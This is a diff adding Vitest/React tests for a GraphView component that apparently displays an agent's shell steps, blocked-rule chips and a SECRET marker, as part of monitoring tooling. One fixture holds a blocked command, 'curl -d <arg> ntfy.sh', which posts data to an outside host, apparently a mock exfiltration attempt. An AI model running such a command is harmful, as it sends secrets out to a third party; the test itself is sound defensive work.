@@ -1,7 +1,7 @@
 import { act, cleanup, render, screen } from '@testing-library/react'
 import { afterEach, describe, expect, it } from 'vitest'
 import { GraphView } from './GraphView'
-import { makeStep, place } from './testing'
+import { makeHidden, makeStep, place, stepsFrom } from './testing'
 
 const settle = () =>
   act(async () => {
@@ -163,5 +163,52 @@ describe('dim', () => {
     const { container } = render(<GraphView steps={place([makeStep(1), blocked(2)], 0, { quiet: true })} epoch={0} />)
     await settle()
     expect(dimmed(container, 'step:1')).toBe('false')
+  })
+})
+
+describe('the group', () => {
+  const flaggedBlock = makeStep(40003, { verdict: 'blocked', rule: 'R1', host: 'ntfy.sh', command: 'curl -d <arg> ntfy.sh' })
+  const group = (flagged = [flaggedBlock]) => ({
+    hidden: makeHidden({ total: 97, shell: 97, blocked: 1 }),
+    flagged,
+  })
+  const windowSteps = () => place(stepsFrom(40100, 20), 100)
+
+  it('draws the summary and a flagged step with its rule in the chip and no lane boxes of its own', async () => {
+    const { container } = render(<GraphView steps={windowSteps()} epoch={0} group={group()} markedOrder={null} />)
+    await settle()
+    expect(screen.getByText('97 earlier steps (1 blocked): 97 shell')).toBeTruthy()
+    expect(screen.getByText('BLOCKED R1')).toBeTruthy()
+    expect(container.querySelector('.react-flow__node-host')).toBeNull()
+    expect(container.querySelector('.react-flow__node-rule')).toBeNull()
+  })
+
+  it('shows SECRET on the marking step in the window and in the group, and both chips when it was blocked', async () => {
+    const inWindow = render(<GraphView steps={windowSteps()} epoch={0} group={null} markedOrder={40105} />)
+    await settle()
+    expect(screen.getAllByText('SECRET')).toHaveLength(1)
+    inWindow.unmount()
+    render(<GraphView steps={windowSteps()} epoch={0} group={group()} markedOrder={40003} />)
+    await settle()
+    expect(screen.getByText('BLOCKED R1')).toBeTruthy()
+    expect(screen.getAllByText('SECRET')).toHaveLength(1)
+  })
+
+  it('keeps the same mounted box when a blocked step moves from the window into the group', async () => {
+    const blocked = (order: number) => makeStep(order, { verdict: 'blocked', rule: 'R1', command: 'curl x' })
+    const first = place([blocked(40100), ...stepsFrom(40101, 19)], 100)
+    const { container, rerender } = render(<GraphView steps={first} epoch={0} group={null} markedOrder={null} />)
+    await settle()
+    const box = container.querySelector('[title^="40100:"]')
+    const wipe = box?.querySelector('[data-testid="border-wipe"]')
+    expect(box).not.toBeNull()
+    expect(wipe).not.toBeNull()
+
+    const slid = [...place(stepsFrom(40101, 19), 101), ...place([makeStep(40120)], 120)]
+    rerender(<GraphView steps={slid} epoch={0} group={group([blocked(40100)])} markedOrder={null} />)
+    await settle()
+    expect(container.querySelector('[title^="40100:"]')).toBe(box)
+    expect(container.querySelector('[title^="40100:"] [data-testid="border-wipe"]')).toBe(wipe)
+    expect(screen.getByText('BLOCKED R1')).toBeTruthy()
   })
 })
